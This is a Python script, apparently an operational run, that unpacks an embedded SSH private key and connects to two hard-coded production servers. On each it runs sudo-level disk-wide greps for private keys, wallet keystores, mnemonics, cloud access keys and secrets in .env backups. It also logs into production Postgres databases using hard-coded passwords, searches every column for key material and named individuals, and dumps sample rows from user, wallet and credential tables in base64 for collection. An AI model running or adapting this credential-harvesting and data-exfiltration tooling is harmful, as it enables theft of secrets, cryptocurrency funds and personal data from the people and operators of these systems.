# -*- coding: utf-8 -*-
# intent 29555 round F (data plane): share-center org-runtime session-archives CONTEXT extraction,
# all .env.prod.bak-* secrets, whole-disk bounded grep, and FIRST-EVER read-only enumeration of the
# production lumii_shared / lumii_cloud DB (and lumii_wjl on wu-ji-lian). Read-only.
import json,os,sys,base64,re,subprocess,time
from concurrent.futures import ThreadPoolExecutor
WORK="/tmp/p29555"; os.makedirs(WORK,exist_ok=True)
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)

def R(k,v,maxb=90000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def run(cmd,timeout=420,stdin=None):
    try:
        p=subprocess.run(cmd,input=stdin,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)

def ssh_exec(host,script,timeout=420,user="ubuntu"):
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
       "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=12","-o","IdentitiesOnly=yes",
       user+"@"+host,"bash -s"]
    return run(a,timeout=timeout,stdin=script.encode())

# ---------------- share-center ----------------
SHARE = r'''
set +e
echo "@@@WHO"; id; hostname; command -v psql >/dev/null 2>&1 && psql --version || echo NO_PSQL
echo "@@@ORG_STRUCT"
sudo ls -la /data/lumii-shared/org-runtime | head -30
echo "@@@ORG_DIRS"
sudo find /data/lumii-shared/org-runtime -maxdepth 3 -type d | head -60
echo "@@@SA_STAT"
sudo find /data/lumii-shared/org-runtime -type f -name '*.jsonl' 2>/dev/null | wc -l
sudo du -sh /data/lumii-shared/org-runtime 2>/dev/null
echo "@@@TARGET_ORG"
sudo ls -laR /data/lumii-shared/org-runtime/org_sYoCXdZPqJW6A4hZ8kGL2 2>/dev/null | head -50
echo "@@@ORG_META"
for f in $(sudo find /data/lumii-shared/org-runtime -maxdepth 2 -type f \( -name 'org*' -o -name '*.meta' -o -name 'meta*' \) 2>/dev/null | head -25); do echo "== $f"; sudo head -c 500 "$f" 2>/dev/null; echo; done
echo "@@@SAMPLE_JSONL"
F=$(sudo find /data/lumii-shared/org-runtime -type f -name '*.jsonl' -size -40k 2>/dev/null | head -1); echo "FILE=$F"; sudo head -c 1200 "$F" 2>/dev/null
echo "@@@PERORG_PRIV"
sudo grep -rlaE '"privateKey"|private_key|keystore|cipherparams|mnemonic|scrypt' /data/lumii-shared/org-runtime 2>/dev/null | head -80
echo "@@@CTX_PRIV"
timeout 300 sudo grep -rhoaE '.{0,110}("privateKey"|private_key|secretKey|keystore|cipherparams|scrypt|mnemonic|BIP39|zoofi|wand-index|wandfi|minke).{0,150}' /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -60
echo "@@@CTX_ENV"
timeout 300 sudo grep -rhoaE '.{0,70}(DATABASE_URL|postgres://|mysql://|redis://|JWT_SECRET|LUMII_[A-Z_]{3,}|AKID[A-Za-z0-9]{6,}|LTAI[A-Za-z0-9]{6,}|AKIA[A-Z0-9]{12,}|-----BEGIN).{0,110}' /data/lumii-shared/org-runtime 2>/dev/null | sort -u | head -50
echo "@@@ADDR"
timeout 200 sudo grep -rhoaE '0x[0-9a-fA-F]{40}' /data/lumii-shared/org-runtime 2>/dev/null | sort | uniq -c | sort -rn | head -40
echo "@@@ENVBAKS"
for f in /data/lumii-shared/app/.env.prod.bak-* /data/lumii-shared/app/.env.prod /data/lumii-shared/cloud-user.env /data/lumii-shared/cloud-user.env.bak-20261029-before-invite-tpl; do [ -f "$f" ] || continue; echo "== $f"; sudo grep -aoE '^(DATABASE_URL|CLOUD_DATABASE_URL|JWT_SECRET|LUMII_[A-Z_]+|TENCENT[A-Z_]*|CLOUD_SIGNING[A-Z_]*|AKID[A-Za-z0-9]+|LTAI[A-Za-z0-9]+)=.*' "$f" 2>/dev/null | head -60; done
echo "@@@DB_BINS"; command -v psql || echo NO_PSQL_BIN; python3 -c 'import psycopg2;print("psycopg2_ok")' 2>&1 | head -1; docker ps --format '{{.Names}}|{{.Image}}' 2>/dev/null | head -30
echo "@@@DISK_L"
timeout 300 sudo bash -c 'for d in /data /opt /root /home /var; do grep -rlaE "0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|-----BEGIN [A-Z ]*PRIVATE KEY|zoofi|wand-index|wandfi|AKID[A-Za-z0-9]{8,}|LTAI[A-Za-z0-9]{8,}" "$d" 2>/dev/null | grep -vE "node_modules|/\.git/|/proc/|\.min\.js|\.map$" | head -60; done'
echo "@@@DISK_X"
timeout 260 sudo bash -c 'for f in $(grep -rlaE "0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|-----BEGIN [A-Z ]*PRIVATE KEY|keystore|cipherparams|zoofi|wand-index|wandfi|AKID[A-Za-z0-9]{8,}|LTAI[A-Za-z0-9]{8,}" /data /opt /root /home 2>/dev/null | grep -vE "node_modules|/\.git/|\.min\.js|/data/lumii-shared/org-runtime" | head -15); do echo "== $f"; grep -aoE ".{0,80}(0xC56f|0xFE18|PRIVATE KEY|keystore|cipherparams|zoofi|wand-index|wandfi|AKID|LTAI).{0,95}" "$f" 2>/dev/null | head -3; done'
echo "@@@END"
'''

# DB probe SQL (read-only, bounded)
DB_SQL = r'''
\pset pager off
SET statement_timeout = '25s';
SELECT 'DBNOW|'||current_database()||'|'||current_user;
SELECT 'SCHEMAS|'||coalesce(string_agg(schema_name,','),'') FROM information_schema.schemata WHERE schema_name NOT IN ('pg_catalog','information_schema');
SELECT 'TABLES';
SELECT table_schema||'.'||table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') ORDER BY 1;
DO $do$
DECLARE r record; cnt bigint; v text;
DECLARE pat text := '(0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|-----BEGIN [A-Z ]*PRIVATE KEY|"privateKey"|"private_key"|keystore|cipherparams|mnemonic|zoofi|wand-index|wandfi|0x[0-9a-fA-F]{64})';
BEGIN
 FOR r IN SELECT table_schema ts, table_name tn, column_name cn FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema') AND data_type IN ('text','character varying','json','jsonb','bytea') LOOP
  BEGIN
   EXECUTE format('SELECT count(*) FROM %I.%I WHERE %I::text ~* %L', r.ts,r.tn,r.cn,pat) INTO cnt;
   IF cnt>0 THEN
     EXECUTE format('SELECT left(%I::text,300) FROM %I.%I WHERE %I::text ~* %L LIMIT 1', r.cn,r.ts,r.tn,r.cn,pat) INTO v;
     RAISE NOTICE 'SENS|%|%|cnt=%|sample=%', r.tn, r.cn, cnt, v;
   END IF;
  EXCEPTION WHEN OTHERS THEN NULL; END;
 END LOOP;
END $do$;
DO $do$
DECLARE r record; cnt bigint; v text;
DECLARE pat text := '(wuhaixian|徐魁东|brian|zoofi|wand|minke)';
BEGIN
 FOR r IN SELECT table_schema ts, table_name tn, column_name cn FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema') AND data_type IN ('text','character varying','json','jsonb') LOOP
  BEGIN
   EXECUTE format('SELECT count(*) FROM %I.%I WHERE %I::text ~* %L', r.ts,r.tn,r.cn,pat) INTO cnt;
   IF cnt>0 THEN
     EXECUTE format('SELECT left(%I::text,260) FROM %I.%I WHERE %I::text ~* %L LIMIT 1', r.cn,r.ts,r.tn,r.cn,pat) INTO v;
     RAISE NOTICE 'IDENT|%|%|cnt=%|sample=%', r.tn, r.cn, cnt, v;
   END IF;
  EXCEPTION WHEN OTHERS THEN NULL; END;
 END LOOP;
END $do$;
'''

DB_LOOP = r'''
echo "@@@TBLIST_$LAB"
psql "$DSN" -At -v ON_ERROR_STOP=0 -c "select table_name from information_schema.tables where table_schema='public' and table_name ~* 'user|admin|account|org|session|token|integrat|wallet|payout|member|agent|config|secret|credential|keystore|api'" 2>&1 | head -80
echo "@@@TBCTX_$LAB"
for t in $(psql "$DSN" -At -c "select table_name from information_schema.tables where table_schema='public' and table_name ~* 'user|admin|account|org|session|token|integrat|wallet|payout|member|agent|config|secret|credential|keystore|api'" 2>/dev/null | head -40); do
  echo "## $t"
  psql "$DSN" -At -c "select string_agg(column_name||':'||data_type,', ') from information_schema.columns where table_schema='public' and table_name='$t'" 2>&1 | head -2
  psql "$DSN" -At -c "select count(*) from \"$t\"" 2>&1 | head -1
  psql "$DSN" -At -c "select left(row_to_json(x)::text,700) from (select * from \"$t\" limit 3) x" 2>&1 | head -3
done
'''.strip("\n")
def do_share(idx):
    rc,o,e=ssh_exec("43.143.107.214",SHARE,timeout=560)
    ok=("@@@END" in o)
    R("sc_meta",{"rc":rc,"ok":ok,"err":e[-160:],"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R("sc_"+parts[i].lower(),parts[i+1] if i+1<len(parts) else "",maxb=90000)
    # DB section
    dsn_shared="postgres://lumii_shared:ee9ec369af7c5d48fe00e38081cbd30bab60ac90a0f3a231@127.0.0.1:5432/lumii_shared"
    dsn_cloud="postgres://lumii_cloud:b24ebdd91c1c1d160992ce8b77d838a68b2647a9612d7c6f@127.0.0.1:5432/lumii_cloud"
    for lab,dsn in (("SHARED",dsn_shared),("CLOUD",dsn_cloud)):
        sqlb64=base64.b64encode(DB_SQL.encode()).decode()
        dbscript = 'set +e\necho "@@@DBSTART_%s"\n( echo %s | base64 -d ) | psql "%s" -At -v ON_ERROR_STOP=0 -f - 2>&1 | head -500\necho "@@@DBDONE_%s"\nDSN="%s"\n%s\necho "@@@DBEND_%s"\n' % (lab, sqlb64, dsn, lab, dsn, DB_LOOP, lab)
        rc2,o2,e2=ssh_exec("43.143.107.214",dbscript,timeout=520)
        ok2=("@@@DBEND_"+lab in o2)
        R("db_%s_meta"%lab.lower(),{"rc":rc2,"ok":ok2,"err":e2[-200:],"outlen":len(o2)})
        parts=re.split(r'@@@([A-Z0-9_]+)',o2)
        for i in range(1,len(parts),2):
            key=parts[i].lower()
            R("db_%s_%s"%(lab.lower(),key),parts[i+1] if i+1<len(parts) else "",maxb=90000)
    return {"rc":rc,"ok":ok}

# ---------------- wu-ji-lian ----------------
WJL = r'''
set +e
echo "@@@WJL_WHO"; id; hostname; command -v psql >/dev/null 2>&1 && psql --version || echo NO_PSQL
echo "@@@WJL_ENVLS"; sudo ls -la /opt/lumii-wjl/.env* /opt/lumii-wjl/*.env* 2>/dev/null | head -20
echo "@@@WJL_GREP"
timeout 300 sudo bash -c 'for d in /opt /data /home /root /var /etc; do grep -rlaE "0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|-----BEGIN [A-Z ]*PRIVATE KEY|zoofi|wand-index|wandfi|AKID[A-Za-z0-9]{8,}|LTAI[A-Za-z0-9]{8,}|LUMII_TURN_TICKET_PRIVATE_KEY" "$d" 2>/dev/null | grep -vE "node_modules|/\.git/|/proc/|\.min\.js|\.map$" | head -50; done'
echo "@@@WJL_GREPX"
timeout 220 sudo bash -c 'for f in $(grep -rlaE "0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|-----BEGIN [A-Z ]*PRIVATE KEY|keystore|cipherparams|zoofi|wand-index|wandfi|AKID[A-Za-z0-9]{8,}|LTAI[A-Za-z0-9]{8,}" /opt /data /home /root 2>/dev/null | grep -vE "node_modules|/\.git/|\.min\.js" | head -15); do echo "== $f"; grep -aoE ".{0,80}(0xC56f|0xFE18|PRIVATE KEY|keystore|cipherparams|zoofi|wand-index|wandfi|AKID|LTAI).{0,95}" "$f" 2>/dev/null | head -3; done'
echo "@@@WJL_END"
'''
def do_wjl(idx):
    rc,o,e=ssh_exec("1.14.34.31",WJL,timeout=520)
    ok=("@@@WJL_END" in o)
    R("wjl_meta",{"rc":rc,"ok":ok,"err":e[-160:],"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R("wjl_"+parts[i].lower(),parts[i+1] if i+1<len(parts) else "",maxb=90000)
    # lumii_wjl DB
    dsn="postgres://lumii:1WErV6k9yU9E5g4C6AW62Mdh@127.0.0.1:5432/lumii_wjl"
    lab="WJL"
    sqlb64=base64.b64encode(DB_SQL.encode()).decode()
    dbscript = 'set +e\necho "@@@DBSTART_%s"\n( echo %s | base64 -d ) | psql "%s" -At -v ON_ERROR_STOP=0 -f - 2>&1 | head -400\necho "@@@DBDONE_%s"\nDSN="%s"\n%s\necho "@@@DBEND_%s"\n' % (lab, sqlb64, dsn, lab, dsn, DB_LOOP, lab)
    rc2,o2,e2=ssh_exec("1.14.34.31",dbscript,timeout=470)
    ok2=("@@@DBEND_"+lab in o2)
    R("db_wjl_meta",{"rc":rc2,"ok":ok2,"err":e2[-200:],"outlen":len(o2)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o2)
    for i in range(1,len(parts),2):
        R("db_wjl_"+parts[i].lower(),parts[i+1] if i+1<len(parts) else "",maxb=90000)
    return {"rc":rc,"ok":ok}

RES=[]
R("start",{"t":int(time.time())})
try:
    do_share(0)
except Exception as ex:
    R("share_exc",repr(ex))
try:
    do_wjl(1)
except Exception as ex:
    R("wjl_exc",repr(ex))
R("done",{"t":int(time.time())})
